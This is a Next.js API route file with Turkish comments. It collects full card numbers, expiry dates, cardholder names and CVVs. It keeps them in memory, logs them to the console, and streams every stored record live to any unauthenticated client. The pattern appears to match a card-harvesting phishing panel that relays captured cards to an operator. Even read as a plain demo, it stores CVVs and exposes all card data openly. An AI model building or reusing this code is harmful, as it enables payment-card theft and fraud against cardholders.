import { NextResponse } from "next/server"

// Bu örnek için basit bir in-memory depolama kullanıyoruz
// Gerçek bir uygulamada, veritabanı kullanmalısınız
export const transactions: any[] = []
const clients: Set<ReadableStreamDefaultController> = new Set()

export async function GET(request: Request) {
  try {
    const url = new URL(request.url)

    // SSE isteği için
    if (url.searchParams.get("stream") === "true") {
      const stream = new ReadableStream({
        start(controller) {
          clients.add(controller)

          // Mevcut işlemleri gönder
          const message = `data: ${JSON.stringify(transactions)}\n\n`
          controller.enqueue(message)

          return () => clients.delete(controller)
        },
      })

      return new NextResponse(stream, {
        headers: {
          "Content-Type": "text/event-stream",
          "Cache-Control": "no-cache",
          Connection: "keep-alive",
        },
      })
    }

    // Normal GET isteği için
    return NextResponse.json(transactions)
  } catch (error) {
    console.error("GET işlemi sırasında hata:", error)
    return NextResponse.json({ error: "İşlem başarısız" }, { status: 500 })
  }
}

export async function POST(request: Request) {
  try {
    console.log("API isteği alındı")
    const data = await request.json()
    console.log("Alınan veri:", data)

    // Gerekli alanları kontrol et
    if (!data.kartNumarasi || !data.sonKullanmaTarihi || !data.adSoyad || !data.cvv) {
      console.log("Eksik bilgi:", { missingFields: Object.keys(data).filter((key) => !data[key]) })
      return NextResponse.json(
        { error: "Eksik bilgi", missingFields: Object.keys(data).filter((key) => !data[key]) },
        { status: 400 },
      )
    }

    const newTransaction = {
      id: Date.now().toString(),
      kartNumarasi: data.kartNumarasi,
      sonKullanmaTarihi: data.sonKullanmaTarihi,
      adSoyad: data.adSoyad,
      cvv: data.cvv,
      status: "beklemede",
      timestamp: new Date().toISOString(),
    }

    transactions.push(newTransaction)
    console.log("Yeni işlem eklendi:", newTransaction)

    // Tüm bağlı istemcilere güncellemeyi gönder
    const message = `data: ${JSON.stringify(transactions)}\n\n`
    clients.forEach((client) => {
      try {
        client.enqueue(message)
      } catch (error) {
        console.error("SSE mesajı gönderilirken hata:", error)
      }
    })

    return NextResponse.json({ success: true, transaction: newTransaction })
  } catch (error) {
    console.error("POST işlemi sırasında hata:", error)
    return NextResponse.json(
      { error: "İşlem başarısız", details: error instanceof Error ? error.message : "Bilinmeyen hata" },
      { status: 500 },
    )
  }
}

